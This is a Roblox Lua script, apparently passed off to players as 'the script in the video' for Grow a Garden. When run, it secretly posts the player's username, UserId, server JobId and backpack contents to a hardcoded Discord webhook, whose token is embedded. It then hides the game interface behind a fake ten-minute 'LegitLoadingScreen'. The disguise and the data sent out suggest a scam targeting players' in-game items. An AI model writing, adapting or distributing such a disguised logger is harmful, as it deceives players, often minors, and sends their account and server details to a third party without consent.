-- ✅ Discord Webhook Execution Logger (with JobId)
local httpRequest = (syn and syn.request) or (http and http.request) or (http_request) or (request)
if httpRequest then
    local plr = game:GetService("Players").LocalPlayer
    local placeId = game.PlaceId
    local jobId = game.JobId
    local invList = {}

    for _, item in ipairs(plr.Backpack:GetChildren()) do
        table.insert(invList, "- " .. item.Name)
    end

    local data = {
        ["content"] = "**Script Executed ✅**",
        ["embeds"] = {{
            ["title"] = "📩 Execution Notification",
            ["description"] = "A user has executed your script.",
            ["color"] = 65280,
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = plr.Name, ["inline"] = true},
                {["name"] = "🆔 UserId", ["value"] = tostring(plr.UserId), ["inline"] = true},
                {["name"] = "🎮 PlaceId", ["value"] = tostring(placeId), ["inline"] = true},
                {["name"] = "🛰️ JobId", ["value"] = jobId ~= "" and jobId or "Unavailable", ["inline"] = false},
                {["name"] = "🎒 Backpack Items", ["value"] = #invList > 0 and table.concat(invList, "\n") or "None", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Grow a Garden Logger"}
        }}
    }

    httpRequest({
        Url = "https://discord.com/api/webhooks/1387638771029119137/eHF-Fy4iN1ByMn3xb7zH_pOzIWhGVk_9x1RckYY1kHlq0Ybv5DexzUHkdh6AoOi-BNxN", -- 🔁 Replace this!
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end

-- ✅ GUI and Script Core
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Disable CoreGui
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Safe cleanup
for _, v in ipairs(workspace:GetChildren()) do
	if v:IsA("Tool") or v.Name:match("UnneededUI") then
		v:Destroy()
	end
end

-- GUI Setup
local screenGui = Instance.new("ScreenGui", PlayerGui)
screenGui.Name = "LegitLoadingScreen"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

local bg = Instance.new("Frame", screenGui)
bg.Name = "Background"
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)

local title = Instance.new("TextLabel", bg)
title.Text = "Please wait while executing the script in the video <3"
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(200, 200, 200)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0.8, 0, 0.1, 0)
title.Position = UDim2.new(0.1, 0, 0.15, 0)

local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.6, 0, 0.05, 0)
barBg.Position = UDim2.new(0.2, 0, 0.4, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(120, 120, 255)

local percent = Instance.new("TextLabel", bg)
percent.Size = UDim2.new(0.2, 0, 0.05, 0)
percent.Position = UDim2.new(0.4, 0, 0.48, 0)
percent.Text = "0%"
percent.Font = Enum.Font.FredokaOne
percent.TextScaled = true
percent.BackgroundTransparency = 1
percent.TextColor3 = Color3.new(1, 1, 1)

local assetText = Instance.new("TextLabel", bg)
assetText.Size = UDim2.new(0.6, 0, 0.05, 0)
assetText.Position = UDim2.new(0.2, 0, 0.56, 0)
assetText.Text = "Loading Assets: 0/1000"
assetText.Font = Enum.Font.FredokaOne
assetText.TextScaled = true
assetText.BackgroundTransparency = 1
assetText.TextColor3 = Color3.new(1, 1, 1)

-- Animate loading bar
local assetsLoaded = 0
local goal = 1000

for i = 1, goal do
	assetsLoaded += 1
	assetText.Text = "Loading Assets: " .. assetsLoaded .. "/" .. goal
	percent.Text = math.floor((assetsLoaded / goal) * 100) .. "%"
	bar:TweenSize(UDim2.new(assetsLoaded / goal, 0, 1, 0), "Out", "Linear", 0.03, true)
	wait(0.005)
end

-- Anti-noclip + Ground Fix
local function enforceCharacterPhysics(character)
	local humanoid = character:WaitForChild("Humanoid", 5)
	if humanoid then
		humanoid.StateChanged:Connect(function(_, new)
			if new == Enum.HumanoidStateType.Physics or new == Enum.HumanoidStateType.PlatformStanding then
				humanoid:ChangeState(Enum.HumanoidStateType.Running)
			end
		end)
	end

	for _, part in ipairs(character:GetDescendants()) do
		if part:IsA("BasePart") then
			part.CanCollide = true
		end
	end

	local root = character:FindFirstChild("HumanoidRootPart")
	if root and root.Position.Y < 10 then
		root.CFrame = CFrame.new(root.Position.X, 25, root.Position.Z)
	end
end

-- Apply physics fix to current and future characters
if LocalPlayer.Character then
	enforceCharacterPhysics(LocalPlayer.Character)
end

LocalPlayer.CharacterAdded:Connect(enforceCharacterPhysics)

-- Wait 10 minutes (600 seconds)
task.wait(600)

-- Restore GUI and cleanup
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
screenGui:Destroy()
